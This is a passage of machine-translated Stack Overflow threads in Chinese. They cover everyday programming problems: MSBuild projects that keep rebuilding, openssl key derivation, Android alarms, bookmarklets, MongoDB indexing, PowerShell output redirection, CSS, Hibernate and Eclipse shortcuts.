3.  然后，我使用此 powershell 脚本禁用了 NTFS 隧道，如本文[所述：](http://ofekshilon.com/2015/08/16/visual-studio-projects-that-just-keep-rebuilding-or-how-quantum-mechanics-mess-up-your-build/)

`New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name "MaximumTunnelEntries" -Value 0 -PropertyType "DWord"`

之后我需要重建，它现在似乎工作。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2015-11-27T05:38:41.933

在我的情况下，罪魁祸首是将引用的 dll 的“复制本地”设置设置为 true，而“复制到输出目录”将文件设置为始终复制。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2020-11-29T12:57:59.463

对于 .Net Core 项目，上述所有解决方案均无效。我找到了解决方案。如果您使用的是 Visual Studio 2019：

1.  两次构建解决方案
2.  开启`Tools`-> `Options`-> `Projects and Solutions`-> `SDK-Style Projects`-> `Logging Level`->`Verbose`
3.  清除输出窗口
4.  构建您的启动项目
5.  检查输出窗口。所有以开头的字符串`FastUpToDate`
6.  您会发现一些项目项使您的项目不是最新的。
7.  修复这些问题并从步骤 1 重试。如果您的修复是正确的，您将`Build: 0 succeeded, 0 failed, {n} up-to-date, 0 skipped`在构建输出的最后一个字符串中实现。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-02-15T19:48:04.143

MSBuild 团队正在这里收集有关调查构建增量问题的文档： [https ://github.com/Microsoft/MSBuild/wiki/Rebuilding%20when%20nothing%20changed](https://github.com/Microsoft/MSBuild/wiki/Rebuilding%20when%20nothing%20changed)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2018-03-19T01:09:49.497

通过增加构建日志的详细程度，我终于找到了另一个我很难找到的罪魁祸首。

在某些情况下，MSBuild**`vc120.pdb`**会在输出文件夹中查找，如果此文件不存在，它将重新构建整个项目。*即使您禁用了调试符号生成*，也会发生这种情况。

此处的解决方法是启用调试符号并生成此文件，然后再次禁用该设置*而不*删除 PDB 文件。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2018-09-13T20:36:21.200

我遇到了同样的问题，结果证明这与几个项目有关，这些项目在他们自己的输出目录中具有对 dll 的复制本地引用。

找到这一点的关键是为构建输出设置诊断输出，但还要知道要在日志中查找什么。搜索：“**不是最新**的”是关键。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2013-02-17T01:01:49.380

这是[VS2010总是重建解决方案的答案？](https://stackoverflow.com/questions/8009757/vs2010-always-rebuilds-solution)

> 通过更改项目文件、清理解决方案、手动删除所有 bin 文件夹、重新启动 Visual Studio 并重建所有内容来解决此问题。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2013-02-17T03:37:23.597

根据您的观察，听起来您的项目以一种不明显的方式表达对其他项目的依赖关系。孤立的依赖项可能会保留在项目文件中，而不会在 UI 中显示。您是否在文本编辑器中打开了一个行为不端的项目文件？检查解决方案构建依赖项？

如果您无法发现任何东西，请尝试从头开始重新创建您的一个项目，以查看新项目是否出现相同的问题。如果干净的项目正确构建，您将知道您在某处表达了不需要的依赖项。据我所知，这些必须在项目文件或解决方案文件中，除非您有 makefile 或其他不寻常的构建步骤。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2015-01-26T13:58:10.363

我和你有同样的问题。我发现它来自一些已删除的文件。当我从项目中删除文件时，问题就消失了。问候。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2015-08-16T17:58:00.407

对于此类构建问题，将 MSBuild 输出详细程度设置为“诊断”确实是必要的第一步。大多数情况下，重新构建的所述原因足以采取行动，但有时 MSBuild 会错误地声称某些文件已修改并需要复制。

如果是这种情况，您需要禁用 NTFS 隧道或将输出文件夹复制到新位置。 [这里有更多的话。](http://ofekshilon.com/2015/08/16/visual-studio-projects-that-just-keep-rebuilding-or-how-quantum-mechanics-mess-up-your-build/)

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2017-02-10T05:00:40.973

另一个经常发生的问题是，当您的解决方案中的某些项目具有未来的修改标记时。如果您将时钟调快，然后将时钟设置为正确的时间，就会发生这种情况。我在安装 Linux 时发生了这种情况。

在这种情况下，您可以使用 git bash 递归地触摸所有文件（是的，在 Windows 中）：

```
find . -exec touch {} \; 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2018-06-12T09:57:46.033

从 Visual Studio 2015 升级到 2017 时，我遇到了 Visual Studio 重建项目的问题，我添加了这个答案是为了让那些可能遇到类似问题的人受益，因为它似乎没有在任何地方记录。

就我而言，问题在于解决方案中的所有项目都具有相同的中间输出路径 (obj)。文件 GeneratedInternalTypeHelper.cs 由包含 XAML 的所有项目生成。直到 Visual Studio 2015，构建过程显然没有检查此文件的文件日期，因此没有出现问题。使用 VS2017 会检查此文件的文件日期，并且因为构建过程中的后续项目将覆盖它（具有相同的内容），所以较早的项目将重新构建，重新触发以后的构建，无限。

在这种情况下的解决方案是确保所有项目都有不同的中间输出目录，这将使问题消失。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2019-06-17T08:31:20.687

在我的情况下（混合 C#、C++/CLI 和本机 C++ 解决方案），即使没有任何改变，一些 C++ 项目正在重新链接。我花了很长时间试图弄清楚发生了什么。最后，我从“命令行”选项中发现，PDB 输出路径（选项 /Fd）无法处理文件夹设置 $(IntDir)。我删除了它 - 一个空值将正确执行默认值 - 我的问题消失了。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2019-11-05T09:45:10.500

正如其他人所注意到的，一个可能的原因是 CopyToOutputDirectory 设置为 Always。这可以通过应用下面的 powershell 脚本在所有项目文件中同时修复：

```
$folder = "C:\My\Solution\Folder"
$csvFiles = Get-ChildItem $folder *.csproj -rec
foreach ($file in $csvFiles)
{
    (Get-Content $file.PSPath -Encoding UTF8 -Raw) |
    Foreach-Object { $_ -replace "<CopyToOutputDirectory>Always</CopyToOutputDirectory>", "<CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>" } |
    Set-Content $file.PSPath -Encoding UTF8 -NoNewline
} 
```*

# encryption - 生成 aes256 cbc 密钥时使用 SHA1 作为消息摘要

> ID：14916735
> 
> 赞同：5
> 
> 时间：2013-02-17T00:27:39.347
> 
> 标签：encryption, openssl, aes, sha1

我必须为我的计算机安全课程做一个实验室，在那里我要使用 gpg 和 OpenSSL 进行安全通信。我对这一步感到困惑：

```
Use 'openssl enc' command line symmetric cipher routine to generate a 
256bit AES key in CBC mode. You should use SHA1 as a message digest 
function for generating the key. Save generated secret key, IV, and 
salt into file named aes.key. (Use –P opting to print out the key, 
salt and IV used then immediately exit, don’t do any encryption at 
this step.) 
```

但是我正在查看[openssl enc 的手册页，](http://www.openssl.org/docs/apps/enc.html)但我看不到摘要的选项。我知道有一个 openssl dgst 命令，但它只是计算输入的哈希值。这个问题有缺陷吗？“您应该使用 SHA1 作为生成密钥的消息摘要函数”是什么意思？我是否生成一个密钥，然后只生成 SHA1(key.aes)？

对此的任何帮助将不胜感激。

谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-17T00:34:46.773

根据您在给它一个未知参数时获得的使用信息，`openssl enc`例如`-h`：

```
-md            the next argument is the md to use to create a key
                 from a passphrase.  One of md2, md5, sha or sha1 
```

因此，您应该使用`-md sha1`将 SHA1 指定为密钥派生中使用的哈希函数。该步骤的完整解决方案是：

```
openssl enc -aes-256-cbc -md sha1 -P 
```

他们实际上似乎忘记`-md`在[手册页](https://www.openssl.org/docs/apps/enc.html)中解释。

# android - 在android上的AlarmManager中安排一个事件

> ID：14916737
> 
> 赞同：1
> 
> 时间：2013-02-17T00:28:04.783
> 
> 标签：android, alarmmanager

我已经阅读了一些教程并阅读了文档，但我无法完成这项工作......这是我一直在测试的：

这是我向警报管理器注册要调用的意图的方式：

```
Calendar cal = Calendar.getInstance();
cal.add(Calendar.MINUTE, 1)

PendingIntent sender = PendingIntent.getBroadcast(this, 192837, new Intent(this, AlarmReceiver.class), PendingIntent.FLAG_UPDATE_CURRENT);

AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender); 
```

我的警报接收器：

```
public class AlarmReceiver extends BroadcastReceiver {

    @Override
public void onReceive(Context context, Intent intent) { 
        Intent intent2 = new Intent(context, NewCommit.class);
        context.startActivity(intent2);
    }   
} 
```

当然，我在 androidManifest.xml 中添加了接收器：

```
<receiver android:process=":remote"  android:name="AlarmReceiver"></receiver> 
```

并且在应用程序标签内。

任何的想法？快把我逼疯了，我找不到问题所在！

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-21T02:13:57.710

我刚刚从pendingIntent添加到意图：

```
intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
```

我希望能帮助别人！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-09T04:18:19.833

您需要在 AndroidManifest.xml 中添加权限

```
<uses-permission android:name="com.android.alarm.permission.SET_ALARM" /> 
```

# javascript - 结合 2 个小册子

> ID：14916742
> 
> 赞同：0
> 
> 时间：2013-02-17T00:28:55.510
> 
> 标签：javascript, bookmarklet

我有 2 个单独的书签

```
javascript: (function () { var url = document.location; var links = document.getElementsByTagName('link'); var myvar = 'none'; for (var i = 0, l; l = links[i]; i++) { if (l.getAttribute('rel') == 'next') { myvar = l.getAttribute('href'); break; } } alert(myvar); })(); 
```

和

```
javascript: (function () { var url = document.location; var links = document.getElementsByTagName('link'); var myvar = 'none'; for (var i = 0, l; l = links[i]; i++) { if (l.getAttribute('rel') == 'prev') { myvar = l.getAttribute('href'); break; } } alert(myvar); })(); 
```

我想将它们组合成一个，以便两者都显示在一个书签中。我希望这会做到，但显然我塞满了

```
javascript: (function () { var url = document.location; var links = document.getElementsByTagName('link'); var myvar = 'none'; var myvar1 = 'none'; for (var i = 0, l; l = links[i]; i++) { if (l.getAttribute('rel') == 'next') { myvar = l.getAttribute('href'); break; } } { if (l.getAttribute('rel') == 'prev') { myvar1 = l.getAttribute('href'); break; } } alert(myvar + ' ' + myvar1); })(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T01:20:30.057

试试这个：

```
javascript: (function () { var url = document.location; var links = document.getElementsByTagName('link'); var prev = 'none', next = 'none'; for (var i = 0, l; l = links[i]; i++) { if (l.getAttribute('rel') == 'prev') { prev = l.getAttribute('href'); } else if(l.getAttribute('rel') == 'next') { next = l.getAttribute('href'); } if(prev != 'none' && next != 'none') { break; }} alert(prev + '\n' + next); })(); 
```

此外，这是一个缩小版：

```
javascript:(function(){for(var e=document.getElementsByTagName("link"),b="none",c="none",d=0,a;(a=e[d])&&!("prev"==a.getAttribute("rel")?b=a.getAttribute("href"):"next"==a.getAttribute("rel")&&(c=a.getAttribute("href")),"none"!=b&&"none"!=c);d++);alert(b+"\n"+c)})(); 
```

# javascript - node.js 向客户端发送数据？

> ID：14916743
> 
> 赞同：3
> 
> 时间：2013-02-17T00:28:57.800
> 
> 标签：javascript, ajax, node.js

我想知道如何将数据从 node.js 发送到客户端？

示例 node.js 代码 -

```
var http = require('http');

var data = "data to send to client";

var server = http.createServer(function (request, response) {
  response.writeHead(200, {"Content-Type": "text/plain"});
  response.end("Hello World\n");
}).listen(8125); 
```

现在，我想将`data`变量发送到客户端并使用 JavaScript 记录它。
我该怎么做？

谢谢 ;）

**编辑：**有谁知道如何发送数组？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-17T00:34:23.827

如果您想在`response.end`使用[Socket.io](http://socket.io)或服务器发送事件之后执行此操作。

如果你想要它之前`res.end`，你会让你的代码看起来像：

```
var http = require('http');

var data = "data to send to client";

var server = http.createServer(function (request, response) {
    response.writeHead(200, {"Content-Type": "text/plain"});
    response.write(data); // You Can Call Response.write Infinite Times BEFORE response.end
    response.end("Hello World\n");
}).listen(8125); 
```

# google-custom-search - 在请求链接的 CSE 规范文件后，Google 会继续轮询多长时间？

> ID：14916747
> 
> 赞同：0
> 
> 时间：2013-02-17T00:29:27.803
> 
> 标签：google-custom-search

当您在服务器上创建带有链接规范文件的 Google 自定义搜索引擎 (CSE) 时，Google 的“FeedFetcher-Google-CoOp”机器人会请求该文件以构建 CSE。似乎即使在结果已返回给用户并且不再使用规范文件之后，谷歌仍会继续定期轮询它至少几天。

我的问题是，在您的 CSE 代码停止请求文件后，Google 将继续轮询文件多长时间，以及是否有任何方法可以强制它立即停止。

（我们创建了一个动态链接的 CSE，它对每个查询都是唯一的，这意味着请求了很多很多规范文件（每次使用不同 GET 参数的相同脚本）。现在我们不再使用它们，FeedFetcher-Google-CoOp 继续用过去的各种参数请求这个脚本。

FeedFetcher-Google-CoOp 会忽略 robots.txt。我们现在返回 410: Gone for all requests，但很难判断这是否有效，因为请求的版本太多（即：/script.php?query=）。理想情况下，无论参数如何，都会有某种方法告诉 Google script.php 不存在，但如果没有 robots.txt，我找不到这样做的方法。

TL;DR: 1) Google 最终会停止自行请求此脚本吗？如果有，什么时候？2）有没有办法立即停止它的请求？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-16T20:24:24.303

如果不理会，谷歌似乎将无限期地继续请求这些文件（至少几个月）。它忽略了 410 (gone) 响应，但它似乎*尊重 301 重定向*！因此，要阻止 Google 尝试请求过时的 CSE 规范，您可以 301 将它们重定向到空文件。Google 可能仍会尝试对其缓存的每组参数再次访问该文件，但此后应停止尝试。

# mongodb - MongoDB 索引不帮助查询多键索引

> ID：14916749
> 
> 赞同：6
> 
> 时间：2013-02-17T00:29:42.310
> 
> 标签：mongodb, performance, mongoengine, mlab, database

我有一组定义了多键索引的文档。但是，仅 43K 文档的查询性能就很差。这个查询的 ~215ms 是否被认为很差？如果 nscanned 是 43902（等于集合中的总文档），我是否正确定义了索引？

文档：

```
{
    "_id": {
        "$oid": "50f7c95b31e4920008dc75dc"
    },
    "bank_accounts": [
        {
            "bank_id": {
                "$oid": "50f7c95a31e4920009b5fc5d"
            },
            "account_id": [
                "ff39089358c1e7bcb880d093e70eafdd",
                "adaec507c755d6e6cf2984a5a897f1e2"
            ]
        }
    ],
    "created_date": "2013,01,17,09,50,19,274089",
} 
```

指数：

```
{ "bank_accounts.bank_id" : 1 , "bank_accounts.account_id" : 1} 
```

询问：

```
db.visitor.find({ "bank_accounts.account_id" : "ff39089358c1e7bcb880d093e70eafdd" , "bank_accounts.bank_id" : ObjectId("50f7c95a31e4920009b5fc5d")}).explain() 
```

解释：

```
{
    "cursor" : "BtreeCursor bank_accounts.bank_id_1_bank_accounts.account_id_1",
    "isMultiKey" : true,
    "n" : 1,
    "nscannedObjects" : 43902,
    "nscanned" : 43902,
    "nscannedObjectsAllPlans" : 43902,
    "nscannedAllPlans" : 43902,
    "scanAndOrder" : false,
    "indexOnly" : false,
    "nYields" : 0,
    "nChunkSkips" : 0,
    "millis" : 213,
    "indexBounds" : {
        "bank_accounts.bank_id" : [
            [
                ObjectId("50f7c95a31e4920009b5fc5d"),
                ObjectId("50f7c95a31e4920009b5fc5d")
            ]
        ],
        "bank_accounts.account_id" : [
            [
                {
                    "$minElement" : 1
                },
                {
                    "$maxElement" : 1
                }
            ]
        ]
    },
    "server" : "Not_Important"
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-19T21:52:18.863

我看到三个因素在起作用。

首先，出于应用程序的目的，请确保 $elemMatch 不是此用例更合适的查询。[http://docs.mongodb.org/manual/reference/operator/elemMatch/](http://docs.mongodb.org/manual/reference/operator/elemMatch/)。如果由于多个子文档满足查询而返回错误的结果似乎会很糟糕。

其次，我想可以通过独立查询每个字段值来解释高 nscanned 值。.find({ bank_accounts.bank_id: X }) 与 .find({"bank_accounts.account_id": Y})。您可能会看到完整查询的 nscanned 大约等于最大子查询的 nscanned。如果索引键被完全评估为一个范围，这不会是预期的，但是......

第三，解释计划的 { "bank_accounts.account_id" : [[{"$minElement" : 1},{"$maxElement" : 1}]] } 子句表明没有对这部分密钥应用范围.

不太确定为什么，但我怀疑它与 account_id 的性质（数组中的子文档中的数组）有关。对于如此高的 nscanned 来说，200 毫秒似乎是正确的。

更高效的文档组织可能是对子文档中的 account_id -> bank_id 关系进行非规范化，并存储：

```
{"bank_accounts": [
{
 "bank_id": X,
 "account_id: Y,
},
{
 "bank_id": X,
 "account_id: Z,
}
]} 
```

而不是： {"bank_accounts": [{ "bank_id": X, "account_id: [Y, Z], }]}

我在下面的测试表明，有了这个组织，查询优化器重新开始工作并在两个键上施加了一个范围：

```
> db.accounts.insert({"something": true, "blah": [{ a: "1", b: "2"} ] })
> db.accounts.ensureIndex({"blah.a": 1, "blah.b": 1})
> db.accounts.find({"blah.a": 1, "blah.b": "A RANGE"}).explain()
{
    "cursor" : "BtreeCursor blah.a_1_blah.b_1",
    "isMultiKey" : false,
    "n" : 0,
    "nscannedObjects" : 0,
    "nscanned" : 0,
    "nscannedObjectsAllPlans" : 0,
    "nscannedAllPlans" : 0,
    "scanAndOrder" : false,
    "indexOnly" : false,
    "nYields" : 0,
    "nChunkSkips" : 0,
    "millis" : 0,
    "indexBounds" : {
        "blah.a" : [
            [
                1,
                1
            ]
        ],
        "blah.b" : [
            [
                "A RANGE",
                "A RANGE"
        ]
    ]
    }
} 
```

# batch-file - 使用路径中的特殊字符将批处理文件转换为powershell

> ID：14916750
> 
> 赞同：0
> 
> 时间：2013-02-17T00:29:55.957
> 
> 标签：batch-file, powershell-2.0, command-line-arguments

我很难编写一个简单的批处理文件作为 powershell 脚本。

考虑这个文件夹结构。注意里面有cool的目录`[1]`... ![在此处输入图像描述](../Images/aa7e273f92581b44dec48d882c484194.png)

[**exiftool.exe**](https://exiftool.org/)
是一个命令实用程序，用于（例如）从嵌入的 MP3 标签中提取图片。如果您需要更多信息，
我[上传了它的帮助。](https://gist.github.com/anonymous/f723b55c5038f28de8f3)

**oldscript.cmd**
`exiftool -picture -b input.mp3 > output.jpg`
这一行是在powershell中写的。我在作者 的[论坛帖子](https://exiftool.org/forum/index.php/topic,3856.msg17838.html)中找到了语法

*   `-picture`代表要提取的标签，`-b`代表二进制模式
*   `input.mp3`是我的测试 mp3，它的路径中可以包含特殊字符，例如 [ 和 ]
*   `> output.jpg`定义名称并将生成的图像保存在同一文件夹中

**newscript.ps1**
我目前最好的非工作代码是：

```
$ownpath = Split-Path $MyInvocation.MyCommand.Path
$exe = $ownpath + '\exiftool.exe'
$input = $ownpath + '\input.mp3'
$outimg = $ownpath + '\output.jpg'    

& $exe -picture -binary $input| Set-Content -literalPath $outimg -encoding UTF8 
```

我发现`Set-Content`它能够通过“-literalpath”处理路径中的特殊字符。但是我仍然无法将批处理转换为 Powershell 脚本，因为与旧的批处理管道 (">") 相比，Set-Content（以及 Out-File 方法）的工作方式似乎有所不同。无论我使用哪种编码，都无法查看生成的图像。上面的[帮助文件](https://gist.github.com/anonymous/f723b55c5038f28de8f3)说 exiftool 使用的是 UTF8 编码。

当然，我尝试了其他[可用的编码](http://ss64.com/ps/set-content.html)，但它们都未能产生可见的图像。我被困在这一点上。所以我最初的问题仍然部分存在“如何将此批处理文件转换为powershell”。

**那么为什么在使用旧的批处理命令时它会起作用呢？**

例如：创建一个文件夹“D:folder”并将这个[带有封面图像的 MP3 文件](http://ge.tt/4PUs8hY/v/1)放入其中。
从上面下载[exiftool.exe](https://exiftool.org/)并将其也放在那里。

旧的批处理命令将起作用并为您提供可见的图像

```
D:\folder\exiftool -picture -binary D:\folder\input.mp3 > D:\folder\output.jpg 
```

具有相同语法的新 Powershell V2 脚本将失败。为什么？

```
& D:\folder\exiftool.exe -picture -binary D:\folder\input.mp3 > D:\folder\output.jpg 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T08:00:18.800

你可以试试这个，虽然我没有测试过，因为我没有嵌入图像的 mp3：

```
$file = & "D:\folder\exiftool.exe" -picture -binary "D:\folder\input.mp3"

[io.file]::WriteAllBytes('D:\folder\input[1].jpg',$file) 
```

编辑：

使用 powershell 控制台中的这一行返回一个可读的图像：

```
 cmd.exe /c "D:\folder\exiftool.exe -picture -binary `"D:\folder\input.mp3`" > image.jpg" 
```

您可以在路径和文件名中使用特殊字符：

```
 $exe = "c:\ps\exiftool.exe"
 $mp3 = "c:\ps\a[1]\input.mp3" 
 $jpg = " c:\ps\a[1]\image[1].jpg"

 cmd.exe /c "$exe -picture -binary $mp3 > $jpg" 
```

路径内有空格：

```
 $exe = "c:\ps\exiftool.exe"
 $mp3 = "`"c:\ps\a [1]\input.mp3`"" 
 $jpg = "`"c:\ps\a [1]\image [1].jpg`""

 cmd.exe /c "$exe -picture -binary $mp3 > $jpg" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T02:03:42.773

尝试这个：

```
& $exe -picture -b $input | Out-File -LiteralPath $output 
```

使用 Start-Process 无需使事情复杂化。因为您计算了 exe 的路径并将结果放入字符串中，所以您只需要使用调用运算符`&`来调用由其后面的字符串命名的命令。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-17T18:42:32.890

这是一个解决方法。看来您无法完全避免旧的 cmd.exe。
谢谢应该去@CB

```
$ownpath = Split-Path $MyInvocation.MyCommand.Path
$exe = $ownpath + '\exiftool.exe'
$input = $ownpath + '\input.mp3'
$output = $ownpath + '\output.jpg'

cmd.exe /c " `"$exe`" -picture -binary `"$input`" > `"$output`" " 
```

![在此处输入图像描述](../Images/769b1eb13162436be7677ecd0d2b31bc.png)

**笔记：**

*   这样，所有路径都可以包含特殊字符，例如 [ 和 ] 或空格
*   额外的空间`" `"$exe`很重要。没有它就行不通。

`set-content`带有, `Out-File`(">"的普通 Powershell 方式是一个别名）并且`[io.file]::WriteAllBytes`都不适用于 exiftool.exe 实用程序。对我来说这是一个奇迹。

# css - margin-top 不移动 i 元素

> ID：14916751
> 
> 赞同：0
> 
> 时间：2013-02-17T00:30:06.817
> 
> 标签：css, position, margin

我有以下css，边距根本不起作用。这是一个实时站点的[链接](http://3jtu.localtunnel.com/~anderskitson/techbasics/blog/)，请记住它是在移动开发中，所以这就是为什么它看起来很有趣。不动的元素是推文旁边的奥斯汀·基森一号

**css**

```
 i{
    font-size:0.6em;
    margin-top:-5px;
    margin-left: -25px;
    position:relative;
    padding-bottom:10px;
        } 
```

**html**

```
<section class="blogPostsSection">
            <header class="blogPostsHeader">
                <?php edit_post_link('edit', '<p>', '</p>'); ?>
            <h2><?php the_date(); ?></h2>
            <h3><?php the_title(); ?></h3>
            </header>
            <?php $image = wp_get_attachment_image_src(get_field('add_images_here'), 'large');?>
             <?php if( $image !=false ) {?>
            <img src="<?php echo $image[0]; ?>" alt="<?php get_the_title(get_field('add_images_here')) ?>" />
            <?php } ?>

            <p>
            <?php the_content(); ?>
            </p>

            <a href="https://twitter.com/share" class="twitter-share-button" 
            data-text="<?php the_title(); ?>" data-via="twitterapi" data-lang="en">Tweet</a>
            <script>
            !function(d,s,id){ var js,fjs=d.getElementsByTagName(s)[0];
            if(!d.getElementById(id)){
                js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";
                fjs.parentNode.insertBefore(js,fjs);
                }
            }
            (document,"script","twitter-wjs");
            </script>

            <a href="http://austin.kitson.org"><i>Austin Kitson</i></a>

        </section> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:34:09.430

你没有包括你的 CSS：你所有的 CSS 和 JS 参考`localhost`。例如，`http://localhost/~anderskitson/techbasics/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=3.3.3`

# hibernate - Jadira 用户类型未找到类定义

> ID：14916752
> 
> 赞同：1
> 
> 时间：2013-02-17T00:30:07.313
> 
> 标签：hibernate, jodatime

我正在尝试使用 Hibernate 保留 JODA LocalDate 属性。

```
@Column(nullable = false)
@Type(type = "org.jadira.usertype.dateandtime.joda.PersistentDateTime")
private DateTime scheduledDepartureTime; 
```

我下载了以下罐子：

```
usertype.jodatime-2.0.1.jar
usertype.spi-3.0.0.GA.jar
usertype.core-3.0.0.GA.jar 
```

并将它们添加到我的类路径中。

尝试执行我的应用程序时，我得到

```
java.lang.ClassNotFoundException: org.jadira.usertype.dateandtime.shared.spi.AbstractSingleColumnUserType 
```

在 Eclipse 中搜索这个类的时候可以找到，但是它位于 中 `org.jadira.usertype.shared.spi`，这就解释了 Exception

知道为什么在错误的包中搜索此类吗？由于我使用的是这些 jar 的最新版本，我怀疑这来自版本问题。

谢谢你的帮助 ！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-19T07:50:02.213

`usertype.core-3.0.0.GA.jar`包含`org.jadira.usertype.dateandtime.joda.PersistentDateTime`您需要的。
仅使用两个依赖项：

```
usertype.spi-3.0.0.GA.jar
usertype.core-3.0.0.GA.jar 
```

# javascript - 点击清除输入值

> ID：14916755
> 
> 赞同：0
> 
> 时间：2013-02-17T00:30:48.477
> 
> 标签：javascript, validation, onclick, reset

在我将错误消息插入输入和文本区域的值后，我正在寻找一些帮助来清除我的输入和文本区域的值。这是我的代码：

HTML

```
<form name="form" action="contact-handler.php" method="post" onsubmit="return contact();">
    <input type="text" name="name" placeholder="Name:">
    <input type="text" name="email" placeholder="E-mail:">
    <select name="subject">
            <option value="0">Categories</option>     
            <option value="1">Web Design</option>
        <option value="2">Web Development</option>
        <option value="3">Graphic Design</option>
        <option value="4">Photography / Video</option>
        <option value="5">Marketing</option>
    </select>
    <textarea name="message" placeholder="Message:"></textarea>
    <input class="button" type="submit" value="Send">
</form> 
```

Java脚本

```
function contact() {

    var name = form.name.value;
    var email = form.email.value;
    var atPosition = email.indexOf("@");
    var dotPosition = email.lastIndexOf(".");
    var subject = form.subject.value;
    var message = form.message.value;
    var flag = 0;

    // Name
    if(name != "" && name.length > 2 && !/[\d]/.test(name)) {
        flag++;
        form.name.style.border="1px solid #CCC";
    }
    else{
        form.name.style.border="1px solid #D73300";
        form.name.value="Please enter a valid name";
    }
    // Email
    if(email != "" && atPosition > 1 && dotPosition > atPosition + 2 && dotPosition + 2 <= email.length) {
        flag++;
        form.email.style.border="1px solid #CCC";
    }
    else{
        form.email.style.border="1px solid #D73300";
        form.email.value="Please enter a valid email";
    }
    // Subject  
    if(subject > 0) {
        flag++;
        form.subject.style.border="1px solid #CCC";
    }
    else{
        form.subject.style.border="1px solid #D73300";
    }
    // Message
    if(message != "" && message.length > 30) {
        flag++;
        form.message.style.border="1px solid #CCC";
    }
    else{
        form.message.style.border="1px solid #D73300";
        form.message.value="Please enter a valid message";
    }
    // Flag
    if(flag == 4) {
            return true;
        }
        else
        {
            return false;
        }   
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:44:41.723

更改`placeholder`属性的值，而不是输入值。并使用样式类：

```
form.element.className = 'error';
form.element.setAttribute('placeholder', "Can I haz a value?"); 
```

（[小提琴](http://jsfiddle.net/GgNHs/)）

更好的方法是将`required="required"`属性添加到表单元素，然后您可以使用[`:invalid`](https://developer.mozilla.org/en-US/docs/CSS/%3ainvalid)伪类设置它们的样式：

```
input:invalid, textarea:invalid{
  border: ....
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:49:38.047

香草JS方式：

```
window.onload = function() {
    var form = document.forms["form"];
    var formElems = form.getElementsByTagName('input');
    formElems.concat(form.getElementsByTagName('textarea'));

    for(i=0; i<formElems.length; i++) {
        formElems[i].onclick = function() {
            if(this.style.borderColor == '#CCC') {
               this.value = '';
            }
        }
    }
}; 
```

把它放在你的联系功能之上。

# objective-c - 正确的#import 方案 Objective-C 项目

> ID：14916761
> 
> 赞同：1
> 
> 时间：2013-02-17T00:32:07.783
> 
> 标签：objective-c, cocos2d-iphone

我正在对一个半大型项目进行一些重组，但我不确定最好的方法。我无法决定在哪里使用我的#imports <...> 跨多个文件。我有一个“Settings.h”样式的标题，其中包含我的许多类所需的大量#define。我应该将类所需的所有内容#importing 到其标题中吗？或者我不应该将任何内容导入标题并使用@class 定义，然后将#import 保存为实际的class.m 文件？

如果不清楚，请告诉我，我会尝试重申。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-17T00:38:24.160

在可能的情况下，更喜欢`@class`在`#import`头文件中。

结果：构建速度更快，产生循环依赖的可能性更小（A 导入 B，B 导入 A）。

您还可以创建一个头文件，将常用的头文件或那些常用的头文件一起#import，这样您就不需要单独#import每个头文件。

# android - 打开 LogCat 视图的最快方法是什么？

> ID：14916764
> 
> 赞同：5
> 
> 时间：2013-02-17T00:32:20.453
> 
> 标签：android, eclipse, logcat

大多数时候我运行一个项目，我需要打开/最大化 LogCat，然后最小化它。通常需要用鼠标点击几下。

单击 Debug 透视图*ctrl+M*上的 LogCat 图标将其最大化，然后单击最小化图标。

想知道有没有更快的方法，希望不需要点击鼠标。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:43:45.590

转到窗口-> 首选项。然后转到常规-> 键。找到条目“Show View (View: Logcat)”进入Binding并按一个键（如F10）。

就个人而言，我使用两个屏幕进行开发。主屏幕上的主窗口和第二个屏幕上的 Logcat、文件资源管理器和控制台。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T01:06:28.643

如果我正确理解您的问题，您已经打开了 LogCat 视图。但是，当你想最大化它时，每次都双击它很痛苦。

解决方案：使用 Ctrl+F7 在“LogCat”、“Console”、“Editor”等视图之间切换。然后当您在特定视图时，只需使用 Ctrl+M 以全屏最大化视图。我想你会喜欢这里提到的一些快捷方式：[http://www.rapidsnail.com/Developer/topic/2012/76/27/60320/ask-next-eclipse-the-commonly-used-shortcut-key。 aspx](http://www.rapidsnail.com/Developer/topic/2012/76/27/60320/ask-next-eclipse-the-commonly-used-shortcut-key.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-06-07T06:20:47.320

*   按 Shift 两次
*   输入 logcat
*   按回车

* * *

